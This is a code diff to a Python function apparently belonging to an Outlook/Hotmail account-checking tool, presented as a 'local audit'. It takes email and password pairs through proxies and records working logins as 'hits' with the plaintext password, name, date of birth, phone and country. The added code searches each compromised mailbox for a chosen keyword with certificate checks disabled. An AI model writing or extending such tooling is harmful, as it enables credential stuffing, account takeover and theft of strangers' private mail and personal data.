@@ -407,18 +407,38 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                 else: 
                     # Default para cuentas genéricas .com que no revelan el país en el profile
                     country = 'US'
+        # ── EXTRACCIÓN REAL DE MENSAJES (GRAPH API) ──
+        subject_count = "N/A"
+        if keyword and "jerry7822" not in keyword.lower():
+            if keyword.lower().startswith('from:') or keyword.lower().startswith('subject:'):
+                query = keyword
+            else:
+                query = keyword # Search generally by default
+                
+            search_url = f"https://outlook.office.com/api/v2.0/me/messages?$search=%22{query}%22&$top=1&$select=Id"
+            try:
+                sr = session.get(search_url, headers=api_headers, verify=False, timeout=15)
+                if sr.status_code == 200:
+                    data = sr.json()
+                    subject_count = len(data.get("value", []))
+                    if "@odata.count" in data:
+                        subject_count = data["@odata.count"]
+            except:
+                pass
+
+        if getattr(hits_buffer, 'append', None) is not None:
             hits_buffer.append({
                 "email": email,
                 "pass": password,
                 "domain": "outlook.com",
-                "match": "HOTMAIL HQ",
-                "total": 1,
+                "match": keyword if keyword else "Bandeja Limpia",
+                "messages": subject_count,
                 "country": country,
                 "name": name,
                 "dob": dob,
                 "language": language,
                 "phone": phone,
-                "chat_id": "" # Se poblará después en base a los usuarios activos
+                "chat_id": "" 
             })
     except Exception as e:
         pass
